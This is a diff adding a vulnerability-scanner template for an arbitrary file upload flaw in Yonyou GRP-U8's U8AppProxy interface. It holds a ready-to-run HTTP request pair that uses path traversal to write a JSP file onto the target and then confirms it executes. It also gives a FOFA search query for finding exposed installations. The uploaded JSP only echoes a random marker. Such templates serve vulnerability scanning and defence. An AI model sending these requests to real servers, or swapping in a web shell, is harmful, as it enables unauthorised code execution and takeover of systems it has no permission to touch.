@@ -1,0 +1,47 @@
+id: yonyou-grp-u8-app-proxy-fileupload
+
+info:
+  name: 用友 GRP-U8 U8AppProxy 任意文件上传
+  author: zan8in
+  severity: critical
+  description: |
+    用友 GRP-U8 U8AppProxy 接口存在任意文件上传，攻击者可上传 JSP 获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s/vrfBOj62Wq54of4rcY-pIQ
+  metadata:
+    max-request: 2
+    fofa-query: title="用友GRP-U8行政事业内控管理软件"
+  tags: yonyou,grp,u8,fileupload
+
+variables:
+  randstr: '{{rand_base(5)}}'
+  randbody: '{{rand_base(12)}}'
+  rboundary: '{{rand_base(8)}}'
+
+http:
+  - raw:
+      - |
+        POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../{{randstr}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+
+        --WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+        Content-Type: image/png
+
+        <% out.println("{{randbody}}");%>
+        --WebKitFormBoundary{{rboundary}}--
+      - |
+        GET /{{randstr}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{randbody}}'
+
+      - type: status
+        status:
+          - 200
